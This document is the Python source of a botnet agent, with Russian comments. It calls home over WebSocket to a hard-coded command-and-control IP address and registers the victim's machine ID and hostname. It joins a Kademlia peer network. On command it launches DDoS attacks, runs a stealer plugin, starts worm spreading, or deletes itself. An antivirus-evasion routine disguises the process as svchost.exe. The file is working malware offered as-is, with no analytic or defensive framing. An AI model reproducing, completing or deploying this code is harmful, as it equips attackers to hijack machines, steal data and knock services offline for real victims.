import asyncio
import websockets
import json
import platform
import os
import socket
import importlib
import sys
from utils.logger import log

C2_URL = 'ws://80.249.146.202:8888'
BOT_ID = ''
PLUGIN_DIR = 'agent_plugins'

def get_id():
    if platform.system() == 'Linux':
        try:
            with open('/etc/machine-id', 'r') as f:
                return f.read().strip()
        except:
            pass
    return socket.gethostname()

def load_plugins():
    plugins = {}
    if not os.path.exists(PLUGIN_DIR):
        return plugins
    for filename in os.listdir(PLUGIN_DIR):
        if filename.endswith('.py') and filename != '__init__.py':
            modname = filename[:-3]
            try:
                spec = importlib.util.spec_from_file_location(modname, os.path.join(PLUGIN_DIR, filename))
                module = importlib.util.module_from_spec(spec)
                sys.modules[modname] = module
                spec.loader.exec_module(module)
                plugins[modname] = module
                log(f"[Agent] Плагин {modname} загружен")
            except Exception as e:
                log(f"[Agent] Ошибка загрузки плагина {modname}: {e}")
    return plugins

# Анти-антивирусные трюки
def evade_av():
    if platform.system() == 'Windows':
        try:
            # Изменяем имя процесса
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
        except:
            pass
        # Маскировка под системный файл
        try:
            sys.executable = "C:\\Windows\\System32\\svchost.exe"
        except:
            pass

async def connect():
    global BOT_ID
    BOT_ID = get_id()
    evade_av()
    plugins = load_plugins()

    from botnet.kademlia_network import KademliaNode
    node = KademliaNode(port=8468)
    asyncio.ensure_future(node.listen())

    while True:
        try:
            async with websockets.connect(C2_URL) as ws:
                await ws.send(json.dumps({
                    'cmd': 'register',
                    'bot_id': BOT_ID,
                    'info': {
                        'os': platform.system(),
                        'hostname': platform.node(),
                    },
                    'bandwidth': 10
                }))
                await node.bootstrap('80.249.146.202', 8468)
                async for msg in ws:
                    data = json.loads(msg)
                    if data.get('cmd') == 'execute':
                        action = data['data'].get('action')
                        if action == 'attack':
                            target = data['data']['target']
                            if 'ddos' in plugins:
                                plugins['ddos'].attack(target)
                        elif action == 'steal':
                            if 'stealer' in plugins:
                                plugins['stealer'].run()
                        elif action == 'worm':
                            from botnet.spreader import start_worm
                            start_worm()
                    elif data.get('cmd') == 'kill':
                        os.remove(__file__)
                        exit(0)
        except Exception as e:
            log(f"[Agent] Ошибка соединения с C2: {e}")
            await asyncio.sleep(10)

if __name__ == '__main__':
    asyncio.run(connect())
